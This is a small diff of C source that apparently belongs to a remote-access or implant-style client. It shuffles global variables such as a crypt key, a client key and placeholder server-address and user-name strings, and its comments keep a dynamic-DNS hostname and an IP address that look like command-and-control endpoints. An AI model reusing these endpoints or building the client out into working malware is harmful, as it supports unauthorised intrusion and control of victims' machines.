@@ -79,10 +79,13 @@ DWORD dwCpuCnt = 0;
 DWORD dwMemPageSize = 0;
 char cCryptKey[32] = { 0 };
 
-//googfun888.servequake.com
-char SERVER_IP_ADDRESS[256] = { 0 };// "69.30.246.202";			
-char gUserName[64] = "test";
 DWORD gServerIP = 0;
+//googfun888.servequake.com
+char SERVER_IP_ADDRESS[256] = "this is ip address";// "69.30.246.202";			
+char gUserName[64] = "this is user name";
+
+//static ADDRESS_WRAPPER gAddrWrapper = { {"that is my ip address"} ,0,{""},{""},{""} };
+
 int gStartMode = 0;
 unsigned char gClientKey[16] = { 0 };
 
